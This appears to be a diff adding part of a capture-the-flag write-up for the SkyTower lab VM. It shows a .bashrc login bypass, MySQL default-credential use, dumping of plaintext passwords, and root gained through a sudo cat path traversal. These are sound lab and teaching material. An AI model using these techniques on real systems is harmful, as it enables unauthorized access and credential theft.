@@ -98,3 +98,84 @@ root@kali:~#
 ```
 
 Aaaaand ... we are eject by the server.
+To bypass this we can simply force the serveur to execute /bin/bash and no .bashrc, then delete bashrc with our shell and then login again.
+
+```
+root@kali ~/v/skytower# ssh john@127.0.0.1 -p 4444 
+john@127.0.0.1's password: 
+Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Feb  6 07:59:17 2019 from localhost
+john@SkyTower:~$ 
+
+```
+
+And we are in !
+
+## Privelege escalation
+
+### John
+
+We are now connected as John and our goal is to get root shell (or the proof at /root/flag.txt). I decide to enumarate using LinEnum.sh. For keeping this write-up easy to read , I won't post the result here. By the way only one line was interesting :
+
+```Mysql Default cred (root/root) working```
+
+Awesome, we can login to mysql database using root acount. So here we go :
+
+```
+mysql> SELECT * FROM login;
++----+---------------------+--------------+
+| id | email               | password     |
++----+---------------------+--------------+
+|  1 | john@skytech.com    | hereisjohn   |
+|  2 | sara@skytech.com    | ihatethisjob |
+|  3 | william@skytech.com | senseable    |
++----+---------------------+--------------+
+3 rows in set (0.00 sec)
+
+```
+"login" was the only table in "Skytech" database, it contains all posix user password. Can't find much more with our friend john, i'll now move to sara.
+
+### Sara
+
+Sara had the same issue with .bashrc, so same trick to bypass :
+- Login using /bin/bash
+- Remove .bashrc
+- Login again normaly
+
+And now... Let's enumerate again ! We can run sudo -l to check if sara is a sudoer.
+
+```
+sara@SkyTower:~$ sudo -l
+Matching Defaults entries for sara on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User sara may run the following commands on this host:
+    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+sara@SkyTower:~$ 
+```
+Nice , sara can use "cat" as root in ```/accouts/*.```
+So we can try to read /accounts/../root/flag.txt ... no ?
+Let's try this :
+```
+sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
+Congratz, have a cold one to celebrate!
+root password is theskytower
+```
+This works pretty great ! We can now su root using this password :
+
+```
+sara@SkyTower:~$ su root
+Password: 
+root@SkyTower:/home/sara# whoami
+root
+```
+
+That's all folks !
